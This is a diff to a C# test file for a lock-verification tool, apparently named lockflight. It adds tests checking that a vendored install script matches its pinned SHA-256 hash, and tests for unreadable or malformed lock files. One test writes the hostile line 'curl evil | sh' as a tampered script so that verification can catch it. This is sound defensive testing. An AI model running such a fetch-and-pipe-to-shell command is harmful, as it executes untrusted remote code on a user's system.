@@ -10,7 +10,10 @@ public sealed class VerifyLockTests : IDisposable
 {
     private const string Version = "0.0.0-ci.7";
 
-    private const string Script = "5555555555555555555555555555555555555555555555555555555555555555";
+    /// <summary>The SHA-256 of <see cref="ScriptText"/>, the stand-in install script.</summary>
+    private const string Script = "5f4d551babaafb59dc80d94b1a3c2d5c97471e78a10c00263743b1b5678e0ef2";
+
+    private const string ScriptText = "install\n";
 
     private readonly DirectoryInfo work = Directory.CreateTempSubdirectory("lockflight-verify-lock-");
 
@@ -87,6 +90,62 @@ public sealed class VerifyLockTests : IDisposable
 
         Assert.Equal(ExitCode.Fail, exitCode);
         Assert.Contains("the key 'binaries.linux-x64' appears twice", output, StringComparison.Ordinal);
+    }
+
+    [Fact]
+    public async Task TheVendoredScriptTheLockPinsMatches()
+    {
+        WriteRelease(rid => Hash(rid));
+        string lockFile = WriteLock(rid => Hash(rid));
+        string script = Path.Combine(work.FullName, "install.sh");
+        File.WriteAllText(script, ScriptText);
+
+        (ExitCode exitCode, string output, _) = await TestConsole.RunAsync(["engine", "verify-lock", lockFile, "--source", Feed, "--script", script], "", work.FullName);
+
+        Assert.Equal(ExitCode.Pass, exitCode);
+        Assert.Contains(".lockflight/ci/install.sh is the script the lock pins", output, StringComparison.Ordinal);
+    }
+
+    [Fact]
+    public async Task AVendoredScriptThatIsNotTheOneTheLockPinsFails()
+    {
+        WriteRelease(rid => Hash(rid));
+        string lockFile = WriteLock(rid => Hash(rid));
+        string script = Path.Combine(work.FullName, "install.sh");
+        File.WriteAllText(script, "curl evil | sh\n");
+
+        (ExitCode exitCode, string output, _) = await TestConsole.RunAsync(["engine", "verify-lock", lockFile, "--source", Feed, "--script", script], "", work.FullName);
+
+        Assert.Equal(ExitCode.Fail, exitCode);
+        Assert.Contains(".lockflight/ci/install.sh is not the script the lock pins", output, StringComparison.Ordinal);
+    }
+
+    [Fact]
+    public async Task AnUnreadableBaseLockIsNamed()
+    {
+        WriteRelease(rid => Hash(rid));
+        string lockFile = WriteLock(rid => Hash(rid));
+        string baseLock = Path.Combine(work.FullName, "base.lock");
+        File.WriteAllText(baseLock, "{ \"schema\": \"lockflight.engine-lock/v9\" }");
+
+        (ExitCode exitCode, string output, _) = await TestConsole.RunAsync(["engine", "verify-lock", lockFile, "--source", Feed, "--base", baseLock], "", work.FullName);
+
+        Assert.Equal(ExitCode.Pass, exitCode);
+        Assert.Contains("warning: the base's lock cannot be read", output, StringComparison.Ordinal);
+    }
+
+    [Fact]
+    public async Task ALockWithABackslashIsUnreadable()
+    {
+        WriteRelease(rid => Hash(rid));
+        string lockFile = WriteLock(rid => Hash(rid));
+        string text = File.ReadAllText(lockFile);
+        File.WriteAllText(lockFile, text.Replace("\"binaries\": {", "\"\\binaries\": {},\n  \"binaries\": {", StringComparison.Ordinal));
+
+        (ExitCode exitCode, string output, _) = await TestConsole.RunAsync(["engine", "verify-lock", lockFile, "--source", Feed], "", work.FullName);
+
+        Assert.Equal(ExitCode.Fail, exitCode);
+        Assert.Contains("the lock holds a backslash", output, StringComparison.Ordinal);
     }
 
     [Fact]
